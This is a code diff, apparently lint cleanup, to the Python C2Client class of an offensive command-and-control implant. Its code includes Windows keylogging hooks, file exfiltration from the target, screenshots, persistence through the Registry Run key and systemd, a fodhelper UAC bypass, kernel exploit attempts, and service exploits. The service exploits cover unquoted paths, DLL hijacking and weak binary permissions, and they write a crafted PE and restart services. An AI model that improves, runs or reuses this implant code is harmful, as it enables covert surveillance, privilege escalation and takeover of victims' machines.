@@ -8,14 +8,13 @@ and autonomous operation capabilities.
 import asyncio
 import logging
 import os
+import platform
 import random
 import time
 from typing import Any, Dict, List, Optional
 
 from .base_c2 import BaseC2
 from .encryption_manager import EncryptionManager
-
-logger = logging.getLogger(__name__)
 
 # Windows API constants for keylogging
 WH_KEYBOARD_LL = 13
@@ -430,7 +429,6 @@ class C2Client(BaseC2):
         """Download file from target system."""
         try:
             import base64
-            import os
 
             if os.path.exists(remote_path):
                 with open(remote_path, 'rb') as f:
@@ -495,7 +493,6 @@ class C2Client(BaseC2):
                 try:
                     import sys
 
-                    from PyQt5.QtGui import QScreen
                     from PyQt5.QtWidgets import QApplication
 
                     app = QApplication.instance()
@@ -514,7 +511,6 @@ class C2Client(BaseC2):
 
                 except ImportError:
                     # Method 3: System-specific commands
-                    import os
                     import subprocess
                     import tempfile
 
@@ -662,6 +658,7 @@ class C2Client(BaseC2):
                                 wintypes.HANDLE = ctypes.c_void_p
                             if not hasattr(wintypes, 'MSG'):
                                 class MSG(ctypes.Structure):
+                                    """Windows MSG structure for message handling."""
                                     _fields_ = [("hwnd", ctypes.c_void_p),
                                               ("message", ctypes.c_uint),
                                               ("wParam", ctypes.c_ulong),
@@ -673,10 +670,12 @@ class C2Client(BaseC2):
                         except (ImportError, AttributeError):
                             # Fallback Windows types for cross-platform compatibility
                             class FallbackWintypes:
+                                """Fallback Windows types for cross-platform compatibility."""
                                 WPARAM = ctypes.c_ulong
                                 LPARAM = ctypes.c_long
                                 HANDLE = ctypes.c_void_p
                                 class MSG(ctypes.Structure):
+                                    """Fallback MSG structure definition."""
                                     _fields_ = [("hwnd", ctypes.c_void_p),
                                               ("message", ctypes.c_uint),
                                               ("wParam", ctypes.c_ulong),
@@ -684,7 +683,12 @@ class C2Client(BaseC2):
                                               ("time", ctypes.c_ulong),
                                               ("pt_x", ctypes.c_long),
                                               ("pt_y", ctypes.c_long)]
-                            wintypes = FallbackWintypes()
+                            from types import SimpleNamespace
+                            wintypes = SimpleNamespace()
+                            wintypes.WPARAM = FallbackWintypes.WPARAM
+                            wintypes.LPARAM = FallbackWintypes.LPARAM
+                            wintypes.HANDLE = FallbackWintypes.HANDLE
+                            wintypes.MSG = FallbackWintypes.MSG
 
                         kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                         user32 = ctypes.WinDLL('user32', use_last_error=True)
@@ -850,9 +854,6 @@ class C2Client(BaseC2):
     async def _gather_system_info(self) -> Dict[str, Any]:
         """Gather comprehensive system information."""
         try:
-            import os
-            import platform
-
             info = {
                 'platform': platform.platform(),
                 'architecture': platform.architecture(),
@@ -920,8 +921,6 @@ class C2Client(BaseC2):
 
     async def _install_persistence(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Install persistence mechanism."""
-        import os
-        import platform
         import subprocess
 
         try:
@@ -942,7 +941,10 @@ class C2Client(BaseC2):
             if os_type == 'windows':
                 if method == 'registry':
                     # Windows Registry Run key persistence
-                    import winreg
+                    if platform.system() != 'Windows':
+                        results['error'] = 'Registry persistence only available on Windows'
+                        return results
+                    import winreg  # pylint: disable=E0401
                     try:
                         key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
@@ -1095,7 +1097,6 @@ WantedBy=multi-user.target
 
     async def _attempt_privilege_escalation(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Attempt privilege escalation."""
-        import platform
 
         try:
             method = data.get('method', 'auto')
@@ -1209,8 +1210,6 @@ WantedBy=multi-user.target
 
     def _check_current_privileges(self) -> Dict[str, Any]:
         """Check current privilege level."""
-        import os
-        import platform
 
         privileges = {
             'os_type': platform.system().lower(),
@@ -1245,9 +1244,10 @@ WantedBy=multi-user.target
 
     def _windows_uac_bypass_fodhelper(self) -> Dict[str, Any]:
         """UAC bypass using fodhelper.exe."""
-        import os
         import subprocess
-        import winreg
+        if platform.system() != 'Windows':
+            return {'success': False, 'error': 'UAC bypass only available on Windows'}
+        import winreg  # pylint: disable=E0401
 
         try:
             # Create registry key for fodhelper UAC bypass
@@ -1288,10 +1288,12 @@ WantedBy=multi-user.target
                 wintypes.HANDLE = ctypes.c_void_p
         except (ImportError, AttributeError):
             class MockWintypes:
+                """Mock Windows types for non-Windows platforms."""
                 HANDLE = ctypes.c_void_p
-            
-            MockWintypes_cls = MockWintypes
-            wintypes = MockWintypes_cls()
+
+            from types import SimpleNamespace
+            wintypes = SimpleNamespace()
+            wintypes.HANDLE = MockWintypes.HANDLE
 
         try:
             # Get current process token
@@ -1334,11 +1336,6 @@ WantedBy=multi-user.target
 
     def _check_privilege(self, token, privilege_name: str) -> bool:
         """Check if a specific privilege is enabled."""
-        try:
-            from ctypes import wintypes
-        except ImportError:
-            # wintypes not available, cannot check Windows privileges
-            return False
 
         try:
             # Validate inputs
@@ -1371,7 +1368,6 @@ WantedBy=multi-user.target
             # For debug privileges, assume available if we're running with admin rights
             if privilege_name == 'SeDebugPrivilege':
                 try:
-                    import os
                     # Basic admin check on Windows
                     if os.name == 'nt':
                         # On Windows, check if we have admin privileges using ctypes
@@ -1490,7 +1486,6 @@ WantedBy=multi-user.target
 
     def _linux_kernel_exploit(self) -> Dict[str, Any]:
         """Attempt kernel-based privilege escalation."""
-        import platform
 
         try:
             kernel_version = platform.release()
@@ -1623,14 +1618,11 @@ WantedBy=multi-user.target
 
         # Check for optional capabilities
         try:
-            import psutil
-            capabilities.append('advanced_system_monitoring')
-        except ImportError:
-            pass
-
-        try:
-            import PIL
-            capabilities.append('screenshot')
+            import importlib.util
+            if importlib.util.find_spec("psutil") is not None:
+                capabilities.append('advanced_system_monitoring')
+            if importlib.util.find_spec("PIL") is not None:
+                capabilities.append('screenshot')
         except ImportError:
             pass
 
@@ -1682,6 +1674,7 @@ WantedBy=multi-user.target
         """Check for known service vulnerabilities."""
         vulnerabilities = []
         service_name = service_info.get('name', '').lower()
+        self.logger.debug(f"Checking vulnerabilities for service: {service_name}")
 
         # Known vulnerable services and their patterns
         vulnerable_patterns = {
@@ -1750,7 +1743,6 @@ WantedBy=multi-user.target
 
     def _check_dll_hijacking_opportunity(self, service_info: Dict[str, Any]) -> bool:
         """Check for DLL hijacking opportunities."""
-        import os
         import subprocess
 
         service_name = service_info.get('name')
@@ -1785,7 +1777,6 @@ WantedBy=multi-user.target
 
     def _check_service_binary_permissions(self, service_info: Dict[str, Any]) -> bool:
         """Check if service binary has weak permissions."""
-        import os
         import subprocess
 
         service_name = service_info.get('name')
@@ -1814,6 +1805,7 @@ WantedBy=multi-user.target
         """Exploit a vulnerable service."""
         vulnerability = service_info.get('vulnerability')
         service_name = service_info.get('name')
+        self.logger.info(f"Exploiting {vulnerability} vulnerability in service: {service_name}")
 
         try:
             if vulnerability == 'unquoted_service_path':
@@ -1832,7 +1824,6 @@ WantedBy=multi-user.target
 
     def _exploit_unquoted_service_path(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
         """Exploit unquoted service path vulnerability."""
-        import os
         import subprocess
         import tempfile
 
@@ -1860,7 +1851,7 @@ WantedBy=multi-user.target
                                 with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_exe:
                                     # Generate real executable payload
                                     import struct
-                                    
+
                                     # Create minimal PE executable header
                                     dos_header = b'MZ' + b'\\x00' * 58 + struct.pack('<L', 0x80)
                                     pe_header = (b'PE\\x00\\x00' +  # PE signature
@@ -1869,13 +1860,13 @@ WantedBy=multi-user.target
                                                b'\\x00' * 16 +  # TimeDateStamp, etc.
                                                struct.pack('<H', 0xe0) +  # SizeOfOptionalHeader
                                                struct.pack('<H', 0x102))  # Characteristics
-                                    
+
                                     # Simple executable that exits cleanly
                                     executable_code = (
                                         b'\\x31\\xc0' +  # xor eax, eax (set return code to 0)
                                         b'\\xc3'  # ret (return)
                                     )
-                                    
+
                                     payload = dos_header + pe_header + executable_code
                                     temp_exe.write(payload)
                                     temp_exe.flush()
@@ -1887,8 +1878,10 @@ WantedBy=multi-user.target
                                     # Try to restart service to trigger exploit
                                     restart_result = subprocess.run(['sc', 'stop', service_name],
                                                                   capture_output=True, text=True)
-                                    subprocess.run(['sc', 'start', service_name],
+                                    start_result = subprocess.run(['sc', 'start', service_name],
                                                  capture_output=True, text=True)
+
+                                    self.logger.debug(f"Service restart: stop={restart_result.returncode}, start={start_result.returncode}")
 
                                     return {
                                         'success': True,
@@ -1929,7 +1922,6 @@ WantedBy=multi-user.target
 
     def _exploit_dll_hijacking(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
         """Exploit DLL hijacking vulnerability."""
-        import os
         import subprocess
         import tempfile
 
@@ -1978,7 +1970,6 @@ WantedBy=multi-user.target
 
     def _exploit_service_binary_permissions(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
         """Exploit weak service binary permissions."""
-        import os
         import shutil
         import subprocess
         import tempfile
@@ -2010,9 +2001,11 @@ WantedBy=multi-user.target
                                 shutil.copy2(temp_exe.name, binary_path)
 
                                 # Restart service
-                                subprocess.run(['sc', 'stop', service_name], capture_output=True)
+                                stop_result = subprocess.run(['sc', 'stop', service_name], capture_output=True)
                                 start_result = subprocess.run(['sc', 'start', service_name],
                                                             capture_output=True, text=True)
+
+                                self.logger.debug(f"Service restart: stop={stop_result.returncode}, start={start_result.returncode}")
 
                                 return {
                                     'success': True,
